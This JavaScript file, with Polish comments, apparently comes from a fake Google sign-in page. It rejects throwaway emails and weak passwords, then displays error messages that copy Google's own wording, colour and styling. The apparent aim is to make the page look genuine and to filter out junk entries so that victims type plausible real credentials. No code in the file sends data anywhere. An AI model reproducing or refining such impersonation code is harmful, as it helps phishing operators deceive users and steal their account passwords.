// =========================================
// WALIDATOR EMAILI - Blokuje fałszywe emaile
// =========================================

const EmailValidator = {
    // Wzorce fałszywych emaili do zablokowania
    fakePatterns: [
        /^[a-z]@[a-z]\.com$/i,           // a@a.com, b@b.com
        /^test@test\./i,                  // test@test.com
        /^demo@demo\./i,                  // demo@demo.com
        /^fake@fake\./i,                  // fake@fake.com
        /^aaa@/i,                         // aaa@cokolwiek
        /^zzz@/i,                         // zzz@cokolwiek
        /^qwerty@/i,                      // qwerty@cokolwiek
        /^asdf@/i,                        // asdf@cokolwiek
        /^123@/i,                         // 123@cokolwiek
        /^admin@admin\./i,                // admin@admin.com
        /^user@user\./i,                  // user@user.com
        /^example@example\./i,            // example@example.com
        /^noreply@/i,                     // noreply@cokolwiek
    ],

    // Domeny które nie istnieją/są testowe
    fakeDomains: [
        'example.com',
        'test.com',
        'test.pl',
        'fake.com',
        'demo.com',
        'localhost.com',
        'domain.com',
        'email.com',
        'mail.com',
        '123.com',
        'aaa.com',
        'zzz.com'
    ],

// ... (twoje patterns i domains bez zmian)

isFakeEmail(email) {
    if (!email || !email.includes('@')) return true;
    
    const emailLower = email.toLowerCase().trim();
    const parts = emailLower.split('@');
    const localPart = parts[0];
    const domainPart = parts[1] || '';
    const domainDots = domainPart.split('.');
    const tld = domainDots[domainDots.length - 1]; // np. 'com', 'pl', 'asdadf'

    // 1. Twoje wzorce regex
    for (let pattern of this.fakePatterns) {
        if (pattern.test(emailLower)) return true;
    }
    
    // 2. Twoja lista zablokowanych domen
    if (this.fakeDomains.includes(domainPart)) return true;
    
    // 3. BLOKADA ZMYŚLONYCH KOŃCÓWEK (TLD)
    // Lista najpopularniejszych końcówek - jeśli kogoś nie ma na liście, to pewnie fake
    const validTLDs = ['pl', 'com', 'net', 'org', 'eu', 'edu', 'gov', 'me', 'info', 'biz', 'online'];
    if (domainDots.length < 2 || !validTLDs.includes(tld)) {
        return true; // Blokuje adresy bez kropki lub ze zmyślonym TLD (np. .asdadf)
    }

    // 4. Blokada powtarzających się znaków (np. aaaaaaa@...)
    if (/([a-z0-9])\1{4,}/.test(localPart)) {
        return true; 
    }

    // 5. Twoje sprawdzenie długości
    if (emailLower.length < 6 || localPart.length < 2) return true;

    return false;
},

    // Pokazuje komunikat błędu
showBlockedMessage() {
        const emailInput = document.querySelector('input[type="text"]');
        const container = emailInput.parentElement;
const label = document.querySelector('.input-label');
        // Jeśli błąd już jest, nie dodawaj drugiego
        if (document.getElementById('google-error-msg')) return;

        // 1. Stylizacja inputa na czerwono
        emailInput.style.borderColor = '#d93025';
        label.style.color = '#d93025';
        
        // 2. Dodanie napisu pod inputem
        const errorMsg = document.createElement('div');
        errorMsg.id = 'google-error-msg';
        errorMsg.style.cssText = `
            color: #d93025;
            font-size: 12px;
            line-height: 1.4;
            margin-top: 8px;
            text-align: left;
            font-family: 'Roboto', arial, sans-serif;
            display: flex;
            align-items: center;
        `;
        
        // Ikonka wykrzyknika (opcjonalnie, ale Google ją ma)
        errorMsg.innerHTML = `
            <svg aria-hidden="true" fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" style="margin-right: 8px;">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
            </svg>
            Nie możemy znaleźć takiego konta Google
        `;

        container.appendChild(errorMsg);

        // Usuń błąd, gdy użytkownik zacznie znowu pisać
        emailInput.addEventListener('input', () => {
            emailInput.style.borderColor = ''; // wróć do normy
            label.style.color = ''
            const msg = document.getElementById('google-error-msg');

            if (msg) msg.remove();
        }, { once: true });
    }
};


const PasswordValidator = {
isValid(password) {
        if (!password) return false;



        if (/^\d+$/.test(password)) {
        return false; // Blokujemy, bo Google na to nie pozwala
    }
        // 1. Min 8 znaków
        if (password.length < 8) return false;

        // 2. Musi mieć WIELKĄ literę I cyfrę (najczęstszy schemat haseł)
       // const hasNumber = /\d/.test(password);
       // const hasUpper = /[A-Z]/.test(password);
      //  if (!hasNumber || !hasUpper) return false;

        // 3. Zakaz spacji (Google ich nie lubi)
        if (/\s/.test(password)) return false;

        // 4. Twoja lista fejków
        const commonFakes = ['12345678', 'password', 'qwertyui', 'haslo123', 'polska123'];
        if (commonFakes.includes(password.toLowerCase())) return false;

        return true;
    },

    showError() {
        const passInput = document.getElementById('password'); // Szukamy po ID
        const label = document.querySelector('.input-label');
        const container = passInput.parentElement;

        if (document.getElementById('pass-error-msg')) return;

        // Stylizacja na czerwono
        passInput.style.borderColor = '#d93025';
        if (label) label.style.color = '#d93025';

        const errorMsg = document.createElement('div');
        errorMsg.id = 'pass-error-msg';
        errorMsg.style.cssText = `
            color: #d93025; 
            font-size: 12px; 
            margin-top: 8px; 
            text-align: left; 
            display: flex; 
            align-items: center;
            font-family: 'Roboto', arial, sans-serif;
        `;
        errorMsg.innerHTML = `
            <svg aria-hidden="true" fill="#d93025" width="16px" height="16px" viewBox="0 0 24 24" style="margin-right: 8px; flex-shrink: 0;">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
            </svg>
            Hasło jest nieprawidłowe. Spróbuj ponownie lub kliknij „Nie pamiętasz hasła”, aby je zresetować.
        `;
        container.appendChild(errorMsg);

        // RESET BŁĘDU (Gdy user zacznie poprawiać)
        passInput.addEventListener('input', () => {
            passInput.style.borderColor = ''; 
            if (label) label.style.color = '';
            const msg = document.getElementById('pass-error-msg');
            if (msg) msg.remove();
        }, { once: true });
    }
};

// Pamiętaj, aby udostępnić oba obiekty na końcu pliku:
window.EmailValidator = EmailValidator;
window.PasswordValidator = PasswordValidator;